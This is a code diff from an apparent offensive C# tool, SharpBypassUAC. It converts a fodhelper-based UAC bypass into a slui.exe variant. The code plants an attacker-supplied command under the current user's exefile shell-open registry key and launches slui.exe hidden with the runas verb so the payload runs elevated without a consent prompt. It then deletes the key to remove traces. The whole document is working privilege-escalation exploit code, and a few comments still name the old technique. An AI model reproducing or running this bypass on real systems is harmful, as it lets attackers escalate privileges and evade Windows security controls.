@@ -8,11 +8,11 @@ using Microsoft.Win32;
 
 namespace SharpBypassUAC
 {
-    public class FodHelper
+    public class Slui
     {
-        public FodHelper (byte[] encodedCommand)
+        public Slui (byte[] encodedCommand)
         {
-            //Credit: https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1
+            //Credit: https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation
 
             //Check if UAC is set to 'Always Notify'
             AlwaysNotify alwaysnotify = new AlwaysNotify();
@@ -20,26 +20,26 @@ namespace SharpBypassUAC
             //Convert encoded command to a string
             string command = Encoding.UTF8.GetString(encodedCommand);
 
-            //Set the registry key for fodhelper
+            //Set the registry key for eventvwr
             RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
-            newkey.CreateSubKey(@"ms-settings\Shell\Open\command");
+            newkey.CreateSubKey(@"exefile\Shell\Open\command");
 
-            RegistryKey fod = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true);
-            fod.SetValue("DelegateExecute", "");
-            fod.SetValue("", @command);
-            fod.Close();
+            RegistryKey sluikey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\exefile\Shell\Open\command", true);
+            sluikey.SetValue("", @command);
+            sluikey.Close();
 
             //start fodhelper
             Process p = new Process();
             p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-            p.StartInfo.FileName = "C:\\windows\\system32\\fodhelper.exe";
+            p.StartInfo.FileName = "C:\\windows\\system32\\slui.exe";
+            p.StartInfo.Verb = "runas";
             p.Start();
 
             //sleep 10 seconds to let the payload execute
             Thread.Sleep(10000);
 
             //Unset the registry
-            newkey.DeleteSubKeyTree("ms-settings");
+            newkey.DeleteSubKeyTree("exefile");
             return;
         }
     }
